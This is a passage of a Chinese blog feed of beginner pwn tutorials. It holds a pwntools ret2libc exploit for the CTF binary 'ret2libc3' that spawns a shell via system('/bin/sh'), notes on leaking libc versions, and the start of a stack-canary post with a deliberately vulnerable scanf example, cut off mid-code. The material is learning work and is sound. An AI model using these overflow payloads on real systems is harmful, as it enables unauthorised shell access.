&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; LibcSearcher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2libc3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret2libc3 = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2libc3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;/lib/i386-linux-gnu/libc.so.6&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = ret2libc3.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_start_main_got = ret2libc3.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__libc_start_main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = ret2libc3.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main = ret2libc3.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#system_addr = libcbase + libc.dump(&amp;quot;system&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#binsh_addr = libcbase + libc.dump(&amp;quot;str_bin_sh&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = &lt;span class=&#34;number&#34;&gt;0xf7de5000&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0003d3d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh_addr =  &lt;span class=&#34;number&#34;&gt;0xf7de5000&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x0017e1db&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = flat([&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;112&lt;/span&gt;, system_addr, &lt;span class=&#34;number&#34;&gt;0xdeadbeef&lt;/span&gt;, binsh_addr])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		虽然这里没有成功,但还是看看exp,理解一下这个思路. 接收到泄露的地址后,用libcsearcher搜索一下,搜索到了之后,用libc_start_main_addr(这个就是虚拟地址) 减去 __libc_start_main的地址(在文件中的偏移),于是就得到了加载libc的基地址,就是这玩意	libc.so.6 &amp;#x3D;&amp;gt; &amp;#x2F;lib&amp;#x2F;i386-linux-gnu&amp;#x2F;libc.so.6 (0xf7de5000),然后再从libc里面搜索要用的函数或者字符串,加上加载的基地址就可以了.&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;libc_start_main_addr = u32(sh.recv()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__libc_start_main&amp;#x27;&lt;/span&gt;, libc_start_main_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = libc_start_main_addr - libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__libc_start_main&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = libcbase + libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh_addr = libcbase + libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;str_bin_sh&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;get shell&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = flat([&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;104&lt;/span&gt;, system_addr, &lt;span class=&#34;number&#34;&gt;0xdeadbeef&lt;/span&gt;, binsh_addr])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h3 id=&#34;关于libc的问题&#34;&gt;&lt;a href=&#34;#关于libc的问题&#34; class=&#34;headerlink&#34; title=&#34;关于libc的问题&#34;&gt;&lt;/a&gt;关于libc的问题&lt;/h3&gt;&lt;p&gt;​		首先,之所以要泄露libc的版本是因为,我们要打一个远程的机器,要利用到它的libc库里的函数,但是不同版本的libc的函数位置等是不一样的,&lt;font color=&#34;red&#34;&gt;所以需要泄露远程机器的libc版本&lt;/font&gt;,然后本地patch进行调试,再打远程.&lt;/p&gt;
&lt;p&gt;​		像很多博客中的例题,是没有远程环境的,所以就自己利用自己本地的环境,链接到自己本地的libc上,不过问题是,有时候libcsearch搜索自己本地的libc搜不出来,版本是错的,目前我也不知道为什么….当然这些工具本身就不是完美的.&lt;/p&gt;
&lt;p&gt;​		这种题的话,如果出现上面的问题,可以就略过搜索libc的环节,直接用本地的就好了.&lt;/p&gt;
&lt;p&gt;​		查看本地libc版本&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# ldd --version&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldd (Ubuntu GLIBC &lt;span class=&#34;number&#34;&gt;2.27&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-3u&lt;/span&gt;buntu1&lt;span class=&#34;number&#34;&gt;.4&lt;/span&gt;) &lt;span class=&#34;number&#34;&gt;2.27&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Copyright (C) &lt;span class=&#34;number&#34;&gt;2018&lt;/span&gt; Free Software Foundation, Inc.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;This is &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; software; see the source &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; copying conditions.  There is NO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;warranty; not even &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Written by Roland McGrath and Ulrich Drepper.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		一般来说都是链接到这个默认的,可以用ldd查看一下,然后直接执行这个文件也可以看到版本&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# ldd ret2libc3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	linux-gate.so&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0xf7fd5000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; =&amp;gt; /lib/i386-linux-gnu/libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0xf7de5000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	/lib/ld-linux.so&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0xf7fd6000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# /lib/i386-linux-gnu/libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt; --version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C Library (Ubuntu GLIBC &lt;span class=&#34;number&#34;&gt;2.27&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-3u&lt;/span&gt;buntu1&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;) stable release version &lt;span class=&#34;number&#34;&gt;2.27&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Copyright (C) &lt;span class=&#34;number&#34;&gt;2018&lt;/span&gt; Free Software Foundation, Inc.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		获取libc版本的话可以有很多方式,可以到libc database网站上查,也可以用libcsearch这个库,&lt;font color=&#34;red&#34;&gt;但不一定百分百准确,&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		比如上面获取了libc_start_main_addr的地址后,就可以去网站上查 &lt;a href=&#34;https://libc.blukat.me/&#34;&gt;https://libc.blukat.me&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		但是确实不准……..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221212120145.png&#34; alt=&#34;image-20230221212120145&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		或者用libcsearch,在上面的代码基础上再加2行&lt;/p&gt;
&lt;p&gt;​		libc &amp;#x3D; LibcSearcher(‘__libc_start_main’, libc_start_main_addr)&lt;/p&gt;
&lt;p&gt;​		libcbase &amp;#x3D; libc_start_main_addr - libc.dump(‘__libc_start_main’)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[+] There are multiple libc that meet current constraints :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.30&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-13.f&lt;/span&gt;c31.i686&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.30&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;-x86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.30&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-3&lt;/span&gt;-x86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.30&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;-x86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.32&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-16.&lt;/span&gt;mga8.x86_64_2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.32&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-17.&lt;/span&gt;mga8.x86_64_2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.32&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-20.&lt;/span&gt;mga8.x86_64_2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.32&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-21.&lt;/span&gt;mga8.x86_64_2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.32&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-18.&lt;/span&gt;mga8.x86_64_2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; - libc&lt;span class=&#34;number&#34;&gt;-2.32&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-19.&lt;/span&gt;mga8.x86_64_2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		咱也不知道为啥..就是不对,,可能数据库汇总没收录??不对呀,这就是很常见的2.27..&lt;/p&gt;
&lt;h1 id=&#34;残留疑问&#34;&gt;&lt;a href=&#34;#残留疑问&#34; class=&#34;headerlink&#34; title=&#34;残留疑问&#34;&gt;&lt;/a&gt;残留疑问&lt;/h1&gt;&lt;p&gt;输入到bss段中的&amp;#x2F;bin&amp;#x2F;sh有什么要求呢?哪里都可以输入吗?为什么输入到bss段?&lt;/p&gt;
&lt;p&gt;好像是pip和github下载的libcsearch有区别&lt;/p&gt;
&lt;p&gt;这个查的不准可以去别的地方查,把libc_start_main_addr打印出来后,去一些网址上查可以&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.jianshu.com/p/5525dde00053&#34;&gt;https://www.jianshu.com/p/5525dde00053&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;为什么nm和exp里的输出不一样,是因为一个是静态,一个是动态加载后的吗&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221224958263.png&#34; alt=&#34;image-20230221224958263&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230221225004604.png&#34; alt=&#34;image-20230221225004604&#34;&gt;&lt;/p&gt;
&lt;p&gt;__libc_start_main 通过这个得到libc?&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_45309916/article/details/119481681&#34;&gt;https://blog.csdn.net/weixin_45309916/article/details/119481681&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-02-18T07:10:56.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/</id>
        <title>pwn入门-8-os保护机制canary</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/"/>
        <content type="html">&lt;p&gt;分类、破解方法&lt;/p&gt;
&lt;h1 id=&#34;简介&#34;&gt;&lt;a href=&#34;#简介&#34; class=&#34;headerlink&#34; title=&#34;简介&#34;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;​		会把canary放到比返回地址还低的位置上,这样溢出的时候,从低地址向高地址溢出,就会覆盖掉canary.&lt;/p&gt;
&lt;p&gt;例子&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;,buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230219151606661.png&#34; alt=&#34;image-20230219151606661&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# gcc -fno-stack-protector canary.c -o fno.out&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# python3 -c &lt;span class=&#34;string&#34;&gt;&amp;quot;print (&amp;#x27;a&amp;#x27;*30)&amp;quot;&lt;/span&gt; | ./fno.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Segmentation &lt;span class=&#34;title function_&#34;&gt;fault&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(core dumped)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# gcc -fstack-protector canary.c -o fno.out&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# python3 -c &amp;quot;&lt;span class=&#34;title function_&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;)&lt;/span&gt;&amp;quot; | ./fno.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*** &lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt; smashing detected ***: &amp;lt;unknown&amp;gt; terminated&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;Aborted&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(core dumped)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		64位和32位不一样,下面进行调试和查看反汇编代码来看一下&lt;/p&gt;
&lt;h2 id=&#34;64位&#34;&gt;&lt;a href=&#34;#64位&#34; class=&#34;headerlink&#34; title=&#34;64位&#34;&gt;&lt;/a&gt;64位&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 